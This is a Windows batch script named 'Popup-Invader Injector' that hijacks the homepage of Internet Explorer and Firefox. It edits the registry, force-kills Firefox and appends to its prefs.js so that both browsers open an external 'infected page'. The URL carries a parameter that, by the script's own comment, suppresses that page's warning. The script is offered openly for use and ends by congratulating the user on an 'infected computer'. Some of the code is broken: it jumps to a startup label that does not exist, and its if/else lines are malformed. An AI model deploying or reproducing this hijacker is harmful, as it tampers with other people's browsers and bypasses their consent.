@echo off

rem  MIT License
rem Copyright (c) 2019 Renaud, Fire-Softwares
rem Permission is hereby granted, free of charge, to any person obtaining a copy
rem of this software and associated documentation files (the "Software"), to deal
rem in the Software without restriction, including without limitation the rights
rem to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
rem copies of the Software, and to permit persons to whom the Software is
rem furnished to do so, subject to the following conditions:
rem The above copyright notice and this permission notice shall be included in all
rem copies or substantial portions of the Software.
rem THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
rem IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
rem FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
rem AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
rem LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
rem OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
rem SOFTWARE.

rem Here you can change the URL of Popup-Invader infected page
rem Warning : adding ?confirm=yes param to the default URL will made
rem Popup-Invader launching by itself without the warning.
set POPUP_INVADER_URL=https://cdn.fire-softwares.ga/popup-invader?confirm=yes
set POPUP_INVADER_VERSION=1.1

rem Clear and send program header
cls
echo [1m[31m-----------------------------------------------------------------------[0m
echo [1m[36mPopup-Invader v%POPUP_INVADER_VERSION% Injector for Windows by Renaud42 from Fire-Softwares
echo [1m[36m      Supported browsers : Internet Explorer, Mozilla Firefox
echo [1m[31m-----------------------------------------------------------------------[0m
echo.

rem Starting installation guide
title ---- Popup-Invader v%POPUP_INVADER_VERSION% Injector ----
goto ask-ie

:reset-to-windir
cd %WINDIR%

rem -------------------------
rem METHODS ASKING FOR INPUTS
rem -------------------------

:ask-ie
rem Asking about Internet Explorer injection
echo Inject to Internet Explorer ? (y for yes, anything else for no)
set INPUT=
set /P INPUT=Your answer : %=%
if /I %INPUT%==y goto ie-payload else goto ask-firefox

:ask-firefox
rem Asking about Mozilla Firefox injection
echo.
echo Inject to Mozilla Firefox ? (y for yes, anything else for no)
set INPUT=
set /P INPUT=Your answer : %=%
if /I %INPUT%==y goto firefox-payload else goto ask-startup

:ask-startup
rem Asking about creating link to launch automatically Popup-Invader at Windows startup
echo.
echo Would you like to launch automatically Popup-Invader at Windows startup ? (y for yes, anything else for no)
set INPUT=
set /P INPUT=Your answer : %=%
if /I %INPUT%==y goto startup-payload else goto end

rem -------------------------
rem        END METHOD
rem -------------------------

:end
echo.
echo.
echo Thanks for using this program.
echo Now you can enjoy your new Popup-Invader infected computer :)
echo.
echo Keep in mind that you can reverse the process by changing the POPUP_INVADER_URL in this batch file by your default homepage URL and then restart the program.
echo.
echo You can support Popup-Invader and Fire-Softwares project by giving a star on this GitHub project, or giving us money through "Sponsor" button on GitHub !
pause
echo Goodbye !
exit

rem -------------------------
rem     BROWSERS PAYLOADS
rem -------------------------

:ie-payload
rem Internet Explorer injection
reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /V "Start Page" /D "%POPUP_INVADER_URL%" /F
goto ask-firefox

:firefox-payload
rem Mozilla Firefox injection
taskkill /IM firefox.exe* /F
cd /D "%APPDATA%\Mozilla\Firefox\Profiles"
cd *.default
set MOZ_PREFS_DIR=%cd%
echo user_pref("browser.startup.homepage", "%POPUP_INVADER_URL%"); >> "%MOZ_PREFS_DIR%\prefs.js"
set MOZ_PREFS_DIR=
call :reset-to-windir
goto ask-startup
